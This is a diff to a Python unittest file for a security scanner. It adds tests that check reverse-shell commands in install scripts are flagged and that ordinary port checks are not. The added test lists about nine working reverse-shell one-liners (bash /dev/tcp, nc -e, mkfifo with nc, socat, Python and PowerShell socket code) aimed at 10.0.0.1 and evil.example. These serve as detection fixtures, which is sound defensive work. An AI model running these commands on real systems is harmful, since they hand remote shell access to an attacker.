@@ -207,6 +207,34 @@ class RuleTest(unittest.TestCase):
         findings = scan({"install.sh": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"})
         self.assertIn(("reverse-shell", "high"), rules(findings))
 
+    def test_reverse_shell_patterns(self):
+        shells = [
+            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            "sh -i >& /dev/udp/evil.example/53 0>&1",
+            "exec 5<>/dev/tcp/evil.example/80; cat <&5 | while read l; do $l; done 0>&1",
+            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f",
+            "nc -e /bin/sh 10.0.0.1 4444",
+            "ncat 10.0.0.1 4444 -e /bin/bash",
+            "socat tcp-connect:10.0.0.1:4444 exec:/bin/sh,pty,stderr",
+            "python3 -c 'import socket,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0)'",
+            "$c = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444); $s = $c.GetStream(); iex $d",
+        ]
+        for line in shells:
+            self.assertIn(("reverse-shell", "high"), rules(scan({"install.sh": line + "\n"})), line)
+
+    def test_port_checks_are_not_reverse_shells(self):
+        checks = [
+            "if (echo > /dev/tcp/127.0.0.1/8080) >/dev/null 2>&1; then",  # NVIDIA/OpenShell release workflow
+            "until (echo > /dev/tcp/localhost/5432) 2>/dev/null; do sleep 1; done",
+            "timeout 1 bash -c '</dev/tcp/db/5432' && echo up",
+            "nc -zv example.com 22",
+            "nc -l 8080",
+            "- reverse shell (`bash -i >& /dev/tcp/...`)",
+        ]
+        for line in checks:
+            self.assertEqual(scan({".github/workflows/ci.yml": "jobs:\n  a:\n    steps:\n      - run: " + line + "\n",
+                                   "install.sh": line + "\n"}), [], line)
+
 
 class WorkflowTest(unittest.TestCase):
     def test_script_injection_in_run_and_github_script(self):
